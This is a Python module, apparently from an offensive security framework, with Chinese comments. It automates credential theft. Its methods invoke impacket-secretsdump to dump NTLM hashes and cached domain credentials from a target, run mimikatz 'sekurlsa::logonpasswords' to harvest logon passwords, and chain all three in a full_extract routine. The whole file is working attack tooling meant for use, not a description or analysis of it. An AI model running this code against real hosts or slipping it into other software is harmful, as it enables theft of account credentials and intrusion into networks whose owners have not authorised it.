# -*- coding: utf-8 -*-
"""cred_extract.py — 凭据获取。

真实调用 secretsdump / mimikatz 等价命令（subprocess，超时 300s）：
  - 哈希 dump（impacket-secretsdump）
  - 密码抓取（mimikatz sekurlsa，Windows 上调用 mimikatz.exe）
  - 凭据缓存（lsadump / cached creds）
未安装工具时明确提示，不 mock。
"""
from __future__ import annotations

import shutil
import subprocess
from typing import Any, Dict, List

TIMEOUT = 300


def _which(name: str) -> Dict[str, Any]:
    p = shutil.which(name)
    return {"available": bool(p), "path": p, "error": None if p else f"{name} not in PATH"}


def _run(cmd: List[str], timeout: int = TIMEOUT) -> Dict[str, Any]:
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True,
                              encoding="utf-8", errors="replace",
                              timeout=timeout, check=False)
        return {"ok": proc.returncode == 0, "rc": proc.returncode,
                "stdout": (proc.stdout or "")[:20000],
                "stderr": (proc.stderr or "")[:4000],
                "error": None, "cmd": cmd}
    except FileNotFoundError as e:
        return {"ok": False, "rc": -1, "stdout": "", "stderr": "",
                "error": f"tool not found: {e}", "cmd": cmd}
    except subprocess.TimeoutExpired:
        return {"ok": False, "rc": -2, "stdout": "", "stderr": "",
                "error": f"timeout after {timeout}s", "cmd": cmd}
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "rc": -3, "stdout": "", "stderr": "",
                "error": str(e), "cmd": cmd}


def _parse_lm_ntlm(out: str) -> List[Dict[str, Any]]:
    creds: List[Dict[str, Any]] = []
    for line in out.splitlines():
        if ":" in line and (":::" in line or ":" in line):
            parts = line.split(":")
            if len(parts) >= 4 and parts[0].strip():
                creds.append({
                    "user": parts[0].strip(),
                    "domain": parts[1].strip() if len(parts) > 1 else "",
                    "lm": parts[2].strip() if len(parts) > 2 else "",
                    "nt": parts[3].strip() if len(parts) > 3 else "",
                    "raw": line[:200],
                })
    return creds


class CredentialExtractor:
    """凭据提取器。"""

    def tools_status(self) -> Dict[str, Any]:
        return {
            "secretsdump": _which("secretsdump.py") or _which("impacket-secretsdump"),
            "mimikatz": _which("mimikatz.exe") or _which("mimikatz"),
            "lsadump": _which("lsadump"),
        }

    def dump_hashes(self, target: str, user: str = "", password: str = "",
                    timeout: int = TIMEOUT) -> Dict[str, Any]:
        # 优先 impacket-secretsdump
        which = shutil.which("secretsdump.py") or shutil.which("impacket-secretsdump")
        if not which:
            return {"ok": False, "error": "secretsdump.py not found in PATH",
                    "hashes": []}
        cmd = [which, f"{user}:{password}@{target}" if user else target]
        res = _run(cmd, timeout)
        if res["ok"]:
            res["hashes"] = _parse_lm_ntlm(res["stdout"])
        else:
            res["hashes"] = []
        return res

    def grab_passwords(self, target: str = "127.0.0.1",
                       timeout: int = TIMEOUT) -> Dict[str, Any]:
        # Windows 本机抓密码，需要 mimikatz
        which = shutil.which("mimikatz.exe") or shutil.which("mimikatz")
        if not which:
            return {"ok": False, "error": "mimikatz not found in PATH",
                    "passwords": []}
        cmd = [which, "sekurlsa::logonpasswords", "exit"]
        res = _run(cmd, timeout)
        if res["ok"]:
            res["passwords"] = [
                {"raw": ln.strip()[:200]} for ln in res["stdout"].splitlines()
                if "NTLM" in ln or "Password" in ln
            ]
        else:
            res["passwords"] = []
        return res

    def cached_creds(self, target: str, user: str = "", password: str = "",
                     timeout: int = TIMEOUT) -> Dict[str, Any]:
        which = shutil.which("secretsdump.py") or shutil.which("impacket-secretsdump")
        if not which:
            return {"ok": False, "error": "secretsdump.py not found", "creds": []}
        cmd = [which, "-cached",
               f"{user}:{password}@{target}" if user else target]
        res = _run(cmd, timeout)
        res["creds"] = res["stdout"].splitlines()[:50] if res["ok"] else []
        return res

    def full_extract(self, target: str, user: str = "", password: str = "",
                     timeout: int = TIMEOUT) -> Dict[str, Any]:
        return {
            "target": target,
            "hashes": self.dump_hashes(target, user, password, timeout),
            "passwords": self.grab_passwords(target, timeout),
            "cached": self.cached_creds(target, user, password, timeout),
        }


_singleton: CredentialExtractor | None = None


def get_cred_extractor() -> CredentialExtractor:
    global _singleton
    if _singleton is None:
        _singleton = CredentialExtractor()
    return _singleton
